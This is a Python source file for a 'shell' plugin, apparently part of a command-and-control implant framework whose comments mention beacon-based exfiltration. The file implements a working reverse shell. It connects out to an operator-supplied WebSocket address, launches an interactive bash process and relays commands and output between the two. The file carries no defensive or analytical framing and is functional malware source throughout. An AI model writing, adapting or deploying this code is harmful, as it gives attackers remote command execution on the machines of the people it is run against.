import asyncio
import websockets
import subprocess
import threading
from typing import List, Dict, Any

from .base_plugin import BasePlugin

class ShellPlugin(BasePlugin):
    """A plugin to provide a reverse shell over WebSockets."""

    def __init__(self):
        self.is_running = False
        self._ws_thread: threading.Thread | None = None
        self._ws_uri: str | None = None

    def get_name(self) -> str:
        return "shell"

    def start(self, args: Dict[str, Any]):
        if self.is_running:
            print("Shell plugin is already running.")
            return

        self._ws_uri = args.get("uri")
        if not self._ws_uri:
            print("Error: WebSocket URI not provided for shell plugin.")
            return

        self.is_running = True
        self._ws_thread = threading.Thread(target=self._shell_session, name="ShellThread")
        self._ws_thread.daemon = True
        self._ws_thread.start()
        print(f"Shell plugin started, connecting to {self._ws_uri}")

    def stop(self):
        if not self.is_running:
            return

        print("Stopping shell plugin...")
        self.is_running = False
        # The async loop will see the flag and exit, closing the socket.
        if self._ws_thread and self._ws_thread.is_alive():
            self._ws_thread.join(timeout=5)
        print("Shell plugin stopped.")

    def get_data(self) -> List[Dict[str, Any]]:
        # This plugin uses a direct, real-time connection.
        # It does not buffer data for beacon-based exfiltration.
        return []

    def _shell_session(self):
        """The main async method that runs in a thread to handle the WebSocket shell."""
        # Create a new event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        # Run the async websocket handler until it completes
        loop.run_until_complete(self._websocket_handler())
        loop.close()

    async def _websocket_handler(self):
        """Handles the WebSocket connection and subprocess management."""
        try:
            async with websockets.connect(self._ws_uri) as websocket:
                # Start the shell process
                process = await asyncio.create_subprocess_shell(
                    '/bin/bash -i',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    stdin=asyncio.subprocess.PIPE
                )

                # Create tasks to forward data between shell and websocket
                read_from_ws = asyncio.create_task(self._forward_ws_to_shell(websocket, process.stdin))
                read_from_shell_stdout = asyncio.create_task(self._forward_shell_to_ws(process.stdout, websocket))
                read_from_shell_stderr = asyncio.create_task(self._forward_shell_to_ws(process.stderr, websocket))

                # Wait for any of the tasks to complete (which means a connection closed or error)
                done, pending = await asyncio.wait(
                    [read_from_ws, read_from_shell_stdout, read_from_shell_stderr],
                    return_when=asyncio.FIRST_COMPLETED
                )

                # Clean up all pending tasks
                for task in pending:
                    task.cancel()

                # Terminate the shell process if it's still running
                if process.returncode is None:
                    process.terminate()
                await process.wait()

        except Exception as e:
            print(f"Shell WebSocket connection error: {e}")
        finally:
            self.is_running = False
            print("Shell session ended.")

    async def _forward_ws_to_shell(self, ws, shell_stdin):
        """Reads commands from WebSocket and writes them to the shell's stdin."""
        while self.is_running:
            try:
                command = await ws.recv()
                shell_stdin.write(command.encode())
                await shell_stdin.drain()
            except websockets.exceptions.ConnectionClosed:
                break

    async def _forward_shell_to_ws(self, shell_stream, ws):
        """Reads output from shell's stdout/stderr and sends it over the WebSocket."""
        while self.is_running:
            try:
                output = await shell_stream.read(1024)
                if not output:
                    break
                await ws.send(output.decode(errors='ignore'))
            except (websockets.exceptions.ConnectionClosed, asyncio.CancelledError):
                break
